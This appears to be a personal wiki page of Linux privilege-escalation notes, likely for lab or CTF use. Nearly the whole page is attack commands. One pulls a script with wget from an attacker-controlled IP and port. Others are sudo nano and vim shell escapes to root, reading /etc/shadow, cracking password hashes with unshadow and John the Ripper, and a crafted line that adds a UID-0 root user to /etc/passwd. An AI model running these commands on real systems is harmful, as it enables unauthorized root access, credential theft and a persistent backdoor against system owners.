===== Vulnerabilities =====

=== Exploit DB ===

SSH
wget or curl from /tmp on tun0 IP and Python port

<code>wget 10.13.26.131:4242/lse.sh</code>

build it
<code>
gcc pwn.c -o pwn
</code> 

SSH terminal
<code>id</code>

=== nano ===
https://gtfobins.github.io/gtfobins/nano/#sudo
If user can run it
check 
<code>sudo -l</code>

Open nano
<code>
sudo nano
</code> 

<code>CTRL+R</code>
<code>CTRL+X</code>
<code>reset; sh 1>&0 2>&0</code>
run id command


/etc/passwd
print the contents of the /etc/shadow file.
<code>nano /etc/shadow</code>

Use unshadow tool to create a file for JTR

can read the /etc/shadow using base64
<code>base64 /etc/shadow | base64 --decode</code>
use unshadow to combine the /etc/passwd with /etc/shadow
<code>unshadow passwd.txt shadow.txt > passwords.txt</code>
Use JTR to crack the password hash
<code>john --wordlist=/usr/share/seclists/Passwords/Cracked-Hashes/milw0rm-dictionary.txt passwords.txt</code>

Create a password to add to /etc/passwd
<code>openssl passwd -1 -salt username password1</code>

output
$1$username$rE6qik0AHqsDUy668imZ41

passwd format
<code>username:$1$username$rE6qik0AHqsDUy668imZ41:0:0:root:/root:/bin/bash</code>


=== vim ===
GTFO
<code>vim -c ':!/bin/sh'</code>
<code>vim --cmd ':set shell=/bin/sh|:shell'</code>

requires vim is compiled with Python support
:py3 for Python 3.
<code>vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'</code>

vim compiled with Lua support.
<code>vim -c ':lua os.execute("reset; exec sh")'</code> 

{{tag>tag1, tag2, "tag 3"}